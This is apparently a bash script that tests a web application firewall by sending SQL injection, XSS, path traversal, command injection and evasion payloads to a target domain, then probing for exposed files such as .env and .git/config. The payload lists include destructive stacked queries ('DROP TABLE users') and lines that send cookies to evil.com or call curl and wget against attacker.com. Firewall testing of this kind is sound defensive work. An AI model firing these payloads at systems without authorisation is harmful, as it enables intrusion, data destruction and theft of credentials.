#!/bin/bash

# ============================================
# Professional WAF Penetration Testing Script
# ============================================

# Configuration
DOMAIN="${1:-http://your-domain.com}"
LOG_FILE="waf_penetration_test_$(date +%Y%m%d_%H%M%S).log"
COLOR_RED='\033[0;31m'
COLOR_GREEN='\033[0;32m'
COLOR_YELLOW='\033[1;33m'
COLOR_BLUE='\033[0;34m'
COLOR_NC='\033[0m' # No Color

# Create results directory
RESULTS_DIR="waf_test_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

# Initialize logging
echo "=== WAF Penetration Testing Started at $(date) ===" | tee -a "$LOG_FILE"
echo "Target: $DOMAIN" | tee -a "$LOG_FILE"
echo "Results will be saved to: $RESULTS_DIR/" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Helper function for colored output
print_result() {
    local test_name=$1
    local status=$2
    local details=$3
    
    if [ "$status" == "BLOCKED" ]; then
        echo -e "${COLOR_GREEN}[✓] $test_name: BLOCKED${COLOR_NC}" | tee -a "$LOG_FILE"
    elif [ "$status" == "PASSED" ]; then
        echo -e "${COLOR_RED}[✗] $test_name: PASSED (VULNERABLE)${COLOR_NC}" | tee -a "$LOG_FILE"
    elif [ "$status" == "WARNING" ]; then
        echo -e "${COLOR_YELLOW}[!] $test_name: $details${COLOR_NC}" | tee -a "$LOG_FILE"
    else
        echo -e "${COLOR_BLUE}[?] $test_name: $details${COLOR_NC}" | tee -a "$LOG_FILE"
    fi
}

# Test with multiple HTTP methods
test_methods() {
    local payload=$1
    local methods=("GET" "POST" "PUT" "DELETE" "PATCH")
    local results=()
    
    for method in "${methods[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$DOMAIN/?test=$payload" 2>/dev/null)
        results+=("$method:$response")
    done
    
    echo "${results[@]}"
}

# Advanced SQL Injection Tests
test_sql_injection() {
    print_result "SQL Injection" "RUNNING" ""
    
    local sql_payloads=(
        # Basic
        "' OR '1'='1"
        "' OR '1'='1'--"
        "' OR '1'='1'#"
        "admin'--"
        "1' AND '1'='1"
        
        # Union-based
        "' UNION SELECT NULL--"
        "' UNION SELECT NULL,NULL--"
        "' UNION SELECT username,password FROM users--"
        "1' UNION SELECT @@version--"
        
        # Time-based blind
        "' AND SLEEP(5)--"
        "' WAITFOR DELAY '00:00:05'--"
        "1' AND pg_sleep(5)--"
        
        # Boolean-based blind
        "' AND '1'='1"
        "' AND '1'='2"
        
        # Stacked queries
        "'; DROP TABLE users;--"
        "1'; DELETE FROM products;--"
        
        # Database fingerprinting
        "' AND (SELECT @@version)--"
        "' AND (SELECT version())--"
        "1' AND (SELECT database())--"
        
        # Evasion techniques
        "'/**/OR/**/'1'='1"
        "1%27%20OR%20%271%27=%271"
        "1%2527%2520OR%2520%25271%2527=%25271"
        "1' OR '1'='1'/*"
    )
    
    local blocked_count=0
    local total_count=0
    
    for payload in "${sql_payloads[@]}"; do
        total_count=$((total_count + 1))
        encoded_payload=$(printf "%s" "$payload" | jq -sRr @uri)
        response=$(curl -s -o /dev/null -w "%{http_code}" "$DOMAIN/?id=$encoded_payload" 2>/dev/null)
        
        if [ "$response" == "403" ] || [ "$response" == "406" ]; then
            blocked_count=$((blocked_count + 1))
        fi
        
        # Save detailed results
        echo "$payload|$response" >> "$RESULTS_DIR/sql_injection_results.txt"
        sleep 0.1
    done
    
    local block_rate=$((blocked_count * 100 / total_count))
    if [ $block_rate -gt 80 ]; then
        print_result "SQL Injection" "BLOCKED" "$blocked_count/$total_count blocked (${block_rate}%)"
    elif [ $block_rate -gt 50 ]; then
        print_result "SQL Injection" "WARNING" "$blocked_count/$total_count blocked (${block_rate}%) - Partial protection"
    else
        print_result "SQL Injection" "PASSED" "$blocked_count/$total_count blocked (${block_rate}%) - VULNERABLE"
    fi
}

# Advanced XSS Tests
test_xss() {
    print_result "Cross-Site Scripting (XSS)" "RUNNING" ""
    
    local xss_payloads=(
        # Basic
        "<script>alert(1)</script>"
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert(1)>"
        "<svg onload=alert(1)>"
        
        # Event handlers
        "\" onmouseover=alert(1)"
        "' onfocus=alert(1)"
        "javascript:alert(1)"
        
        # Encoded
        "%3Cscript%3Ealert(1)%3C/script%3E"
        "%253Cscript%253Ealert(1)%253C/script%253E"
        
        # DOM-based
        "#'><script>alert(1)</script>"
        "javascript:alert(document.cookie)"
        
        # Advanced evasion
        "<scr<script>ipt>alert(1)</scr</script>ipt>"
        "<img src=\"x\" onerror=\"alert(1)\">"
        "<body onload=alert(1)>"
        "<input type=\"text\" value=\"XSS\" onfocus=alert(1)>"
        
        # HTML5 vectors
        "<video><source onerror=alert(1)>"
        "<audio src=x onerror=alert(1)>"
        "<iframe src=javascript:alert(1)>"
        
        # Cookie theft attempts
        "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
    )
    
    local blocked_count=0
    local total_count=0
    
    for payload in "${xss_payloads[@]}"; do
        total_count=$((total_count + 1))
        encoded_payload=$(printf "%s" "$payload" | jq -sRr @uri)
        response=$(curl -s -o /dev/null -w "%{http_code}" "$DOMAIN/?search=$encoded_payload" 2>/dev/null)
        
        if [ "$response" == "403" ] || [ "$response" == "406" ]; then
            blocked_count=$((blocked_count + 1))
        fi
        
        echo "$payload|$response" >> "$RESULTS_DIR/xss_results.txt"
        sleep 0.1
    done
    
    local block_rate=$((blocked_count * 100 / total_count))
    if [ $block_rate -gt 80 ]; then
        print_result "XSS" "BLOCKED" "$blocked_count/$total_count blocked (${block_rate}%)"
    else
        print_result "XSS" "PASSED" "$blocked_count/$total_count blocked (${block_rate}%) - VULNERABLE"
    fi
}

# Path Traversal / LFI Tests
test_path_traversal() {
    print_result "Path Traversal & LFI" "RUNNING" ""
    
    local traversal_payloads=(
        # Basic
        "../../../etc/passwd"
        "..\\..\\..\\windows\\win.ini"
        "../../../../etc/passwd"
        
        # URL encoded
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "..%252F..%252F..%252Fetc%252Fpasswd"
        
        # Double encoding
        "%252e%252e%252fetc%252fpasswd"
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        
        # With null byte
        "../../../etc/passwd%00.jpg"
        "../../../etc/passwd.jpg%00"
        
        # Advanced
        "/etc/passwd"
        "./../../etc/passwd"
        "....//....//....//etc/passwd"
        
        # Log poisoning attempts
        "../../../../var/log/apache2/access.log"
        "../../../../var/log/nginx/access.log"
        
        # PHP wrappers
        "php://filter/convert.base64-encode/resource=config.php"
        "php://input"
        
        # Windows specific
        "../../../../boot.ini"
        "../../../../windows/repair/sam"
    )
    
    local blocked_count=0
    local total_count=0
    
    for payload in "${traversal_payloads[@]}"; do
        total_count=$((total_count + 1))
        encoded_payload=$(printf "%s" "$payload" | jq -sRr @uri)
        response=$(curl -s -o /dev/null -w "%{http_code}" "$DOMAIN/?file=$encoded_payload" 2>/dev/null)
        
        if [ "$response" == "403" ] || [ "$response" == "406" ]; then
            blocked_count=$((blocked_count + 1))
        fi
        
        # Check for sensitive data in response (potential successful LFI)
        if [ "$response" == "200" ]; then
            curl -s "$DOMAIN/?file=$encoded_payload" | grep -qi "root:x:\|boot loader\|\[boot loader\]" && {
                echo "WARNING: Potential successful LFI with payload: $payload" | tee -a "$LOG_FILE"
                echo "Payload: $payload" >> "$RESULTS_DIR/successful_lfi.txt"
            }
        fi
        
        echo "$payload|$response" >> "$RESULTS_DIR/path_traversal_results.txt"
        sleep 0.1
    done
    
    local block_rate=$((blocked_count * 100 / total_count))
    if [ $block_rate -gt 80 ]; then
        print_result "Path Traversal" "BLOCKED" "$blocked_count/$total_count blocked (${block_rate}%)"
    else
        print_result "Path Traversal" "PASSED" "$blocked_count/$total_count blocked (${block_rate}%) - VULNERABLE"
    fi
}

# Command Injection Tests
test_command_injection() {
    print_result "Command Injection" "RUNNING" ""
    
    local cmd_payloads=(
        # Basic
        "127.0.0.1; ls"
        "127.0.0.1; id"
        "127.0.0.1; cat /etc/passwd"
        "| ls"
        "; ls"
        "|| ls"
        "&& ls"
        
        # With encoding
        "127.0.0.1%3B ls"
        "127.0.0.1%3Bcat%20/etc/passwd"
        
        # Advanced
        "127.0.0.1; whoami"
        "127.0.0.1; pwd"
        "127.0.0.1; uname -a"
        "\`id\`"
        "$(id)"
        
        # DNS exfiltration attempts
        "; nslookup attacker.com"
        "; curl http://attacker.com"
        "; wget http://attacker.com"
        
        # Time-based
        "; sleep 5"
        "| sleep 5"
        "|| sleep 5"
        "&& ping -c 5 127.0.0.1"
    )
    
    local blocked_count=0
    local total_count=0
    
    for payload in "${cmd_payloads[@]}"; do
        total_count=$((total_count + 1))
        encoded_payload=$(printf "%s" "$payload" | jq -sRr @uri)
        
        # Measure response time for time-based detection
        start_time=$(date +%s%N)
        response=$(curl -s -o /dev/null -w "%{http_code}" "$DOMAIN/?cmd=$encoded_payload" 2>/dev/null)
        end_time=$(date +%s%N)
        duration=$((($end_time - $start_time) / 1000000))
        
        if [ "$response" == "403" ] || [ "$response" == "406" ]; then
            blocked_count=$((blocked_count + 1))
        fi
        
        # Check for time-based injection success
        if [ $duration -gt 3000 ]; then
            echo "WARNING: Potential time-based injection with payload: $payload (${duration}ms)" | tee -a "$LOG_FILE"
            echo "$payload|$duration" >> "$RESULTS_DIR/time_based_cmd.txt"
        fi
        
        echo "$payload|$response|${duration}ms" >> "$RESULTS_DIR/cmd_injection_results.txt"
        sleep 0.5
    done
    
    local block_rate=$((blocked_count * 100 / total_count))
    if [ $block_rate -gt 80 ]; then
        print_result "Command Injection" "BLOCKED" "$blocked_count/$total_count blocked (${block_rate}%)"
    else
        print_result "Command Injection" "PASSED" "$blocked_count/$total_count blocked (${block_rate}%) - VULNERABLE"
    fi
}

# Advanced Evasion Techniques
test_evasion() {
    print_result "WAF Evasion Techniques" "RUNNING" ""
    
    local evasion_payloads=(
        # Case manipulation
        "sElEcT * FrOm UsErS"
        "<ScRiPt>alert(1)</ScRiPt>"
        
        # Comment obfuscation
        "1'/**/OR/**/'1'='1"
        "<script><!--alert(1)--></script>"
        
        # Encoding tricks
        "%55%4E%49%4F%4E%20%53%45%4C%45%43%54"  # HEX encoded
        "CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)"  # CHAR() obfuscation
        
        # Null byte injection
        "<script%00>alert(1)</script>"
        "%00<script>alert(1)</script>"
        
        # Mixed encoding
        "%3c%73%63%72%69%70%74%3ealert(1)%3c%2f%73%63%72%69%70%74%3e"
        
        # Line breaks
        "%0a<script>%0aalert(1)%0a</script>%0a"
    )
    
    local bypassed=0
    local total=0
    
    for payload in "${evasion_payloads[@]}"; do
        total=$((total + 1))
        encoded_payload=$(printf "%s" "$payload" | jq -sRr @uri)
        response=$(curl -s -o /dev/null -w "%{http_code}" "$DOMAIN/?test=$encoded_payload" 2>/dev/null)
        
        if [ "$response" == "200" ]; then
            bypassed=$((bypassed + 1))
            echo "EVASION SUCCESS: $payload -> HTTP $response" | tee -a "$LOG_FILE"
            echo "$payload|$response" >> "$RESULTS_DIR/evasion_success.txt"
        fi
        
        echo "$payload|$response" >> "$RESULTS_DIR/evasion_results.txt"
        sleep 0.1
    done
    
    if [ $bypassed -eq 0 ]; then
        print_result "WAF Evasion" "BLOCKED" "All $total evasion attempts blocked"
    else
        print_result "WAF Evasion" "PASSED" "$bypassed/$total evasion techniques bypassed WAF"
    fi
}

# Rate Limiting Test
test_rate_limiting() {
    print_result "Rate Limiting" "RUNNING" ""
    
    local responses=()
    local blocked=0
    
    # Send 50 rapid requests
    for i in {1..50}; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$DOMAIN/" 2>/dev/null)
        responses+=($response)
        if [ "$response" == "429" ] || [ "$response" == "503" ]; then
            blocked=$((blocked + 1))
        fi
        printf "\rProgress: %d/50 requests sent" $i
    done
    echo ""
    
    print_result "Rate Limiting" "$([ $blocked -gt 0 ] && echo "BLOCKED" || echo "PASSED")" "$blocked requests were rate-limited"
    
    # Save detailed results
    printf "%s\n" "${responses[@]}" > "$RESULTS_DIR/rate_limit_results.txt"
}

# HTTP Headers Security Test
test_security_headers() {
    print_result "Security Headers" "RUNNING" ""
    
    headers=$(curl -sI "$DOMAIN/" 2>/dev/null)
    
    # Check essential security headers
    echo "$headers" > "$RESULTS_DIR/security_headers.txt"
    
    local missing_headers=()
    local headers_to_check=(
        "X-Frame-Options"
        "X-Content-Type-Options"
        "X-XSS-Protection"
        "Content-Security-Policy"
        "Strict-Transport-Security"
        "Referrer-Policy"
        "Permissions-Policy"
    )
    
    for header in "${headers_to_check[@]}"; do
        if ! echo "$headers" | grep -qi "^$header:"; then
            missing_headers+=("$header")
        fi
    done
    
    if [ ${#missing_headers[@]} -eq 0 ]; then
        print_result "Security Headers" "BLOCKED" "All essential security headers present"
    else
        print_result "Security Headers" "WARNING" "Missing headers: ${missing_headers[*]}"
    fi
}

# Information Disclosure Test
test_info_disclosure() {
    print_result "Information Disclosure" "RUNNING" ""
    
    local sensitive_paths=(
        "/.git/config"
        "/.env"
        "/.htaccess"
        "/config.php"
        "/wp-config.php"
        "/backup.sql"
        "/phpinfo.php"
        "/server-status"
        "/.git/HEAD"
        "/robots.txt"
        "/sitemap.xml"
        "/crossdomain.xml"
        "/.DS_Store"
        "/README.md"
        "/composer.json"
        "/package.json"
    )
    
    local disclosures=0
    
    for path in "${sensitive_paths[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$DOMAIN$path" 2>/dev/null)
        
        if [ "$response" == "200" ]; then
            disclosures=$((disclosures + 1))
            echo "INFO DISCLOSURE: $path accessible (HTTP $response)" | tee -a "$LOG_FILE"
            echo "$path|$response" >> "$RESULTS_DIR/info_disclosure.txt"
        fi
        
        echo "$path|$response" >> "$RESULTS_DIR/info_disclosure_results.txt"
    done
    
    if [ $disclosures -eq 0 ]; then
        print_result "Information Disclosure" "BLOCKED" "No sensitive paths exposed"
    else
        print_result "Information Disclosure" "PASSED" "$disclosures sensitive paths exposed"
    fi
}

# Run all tests
echo "Starting comprehensive WAF penetration testing..." | tee -a "$LOG_FILE"
echo "This may take several minutes..." | tee -a "$LOG_FILE"
echo ""

test_sql_injection
sleep 2
test_xss
sleep 2
test_path_traversal
sleep 2
test_command_injection
sleep 2
test_evasion
sleep 2
test_rate_limiting
sleep 2
test_security_headers
sleep 2
test_info_disclosure

# Generate summary report
echo ""
echo "==========================================" | tee -a "$LOG_FILE"
echo "WAF Penetration Testing Complete" | tee -a "$LOG_FILE"
echo "==========================================" | tee -a "$LOG_FILE"
echo "Detailed results saved to: $RESULTS_DIR/" | tee -a "$LOG_FILE"
echo "Log file: $LOG_FILE" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Count vulnerabilities
vuln_count=$(grep -c "PASSED" "$LOG_FILE")
if [ $vuln_count -gt 0 ]; then
    echo -e "${COLOR_RED}⚠️  WARNING: $vuln_count potential vulnerabilities detected!${COLOR_NC}" | tee -a "$LOG_FILE"
    echo "Review the log file for details." | tee -a "$LOG_FILE"
else
    echo -e "${COLOR_GREEN}✓ No major vulnerabilities detected. WAF appears effective.${COLOR_NC}" | tee -a "$LOG_FILE"
fi

echo "=== WAF Testing Completed at $(date) ===" | tee -a "$LOG_FILE"
